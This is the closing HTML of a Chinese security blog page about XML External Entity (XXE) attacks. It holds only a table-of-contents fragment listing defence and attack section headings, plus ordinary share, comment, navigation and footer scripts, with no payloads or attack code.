class="toc-number">2.1.</span> <span class="toc-text">防御</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#方案一、使用开发语言提供的禁用外部实体的方法"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">方案一、使用开发语言提供的禁用外部实体的方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#方案二、过滤用户提交的XML数据"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">方案二、过滤用户提交的XML数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#json节点的Content-Type-XXE攻击"><span class="toc-number">2.2.</span> <span class="toc-text">json节点的Content-Type XXE攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#带上一个xxe-cheat-sheet，DTD-Attacks"><span class="toc-number">2.2.1.</span> <span class="toc-text">带上一个xxe-cheat-sheet，DTD-Attacks</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考security-tencent-com，91ri-org"><span class="toc-number">2.3.</span> <span class="toc-text">参考security.tencent.com，91ri.org</span></a></li></ol></li></ol>
</div>
<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>





<div class="bdsharebuttonbox">
	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>




    
      <div class="duoshuo" id="comments">
    <!-- 多说评论框 start -->
    <div class="ds-thread" data-thread-key="2016/06/28/xxe/" data-title="XML External Entity(XXE)" data-url="http://yoursite.com/2016/06/28/xxe/"></div>
    <!-- 多说评论框 end -->
    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
    <script type="text/javascript">
    var duoshuoQuery = {short_name:"0kami"};
    (function() {
        var ds = document.createElement('script');
        ds.type = 'text/javascript';ds.async = true;
        ds.src = '/js/embed.js';
        ds.charset = 'UTF-8';
        (document.getElementsByTagName('head')[0] 
         || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
    </script>
    <!-- 多说公共JS代码 end -->
</div>

    



    <div class="scroll" id="post-nav-button">
        
            <a href="/2016/07/04/file-upload-vul/" title="上一篇: 文件上传学习总结">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2016/03/20/Bctf-Crypto-SpecialRSA-writeup/" title="下一篇: Bctf Crypto SpecialRSA writeup">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/file-upload-vul/">文件上传学习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/28/xxe/">XML External Entity(XXE)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/20/Bctf-Crypto-SpecialRSA-writeup/">Bctf Crypto SpecialRSA writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/DOM-XSS/">DOM XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/16/flask-virtualenv/">flask virtualenv环境搭建</a></li></ul>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>



    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2016 0kami-zj9s
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >海贼到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 5;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>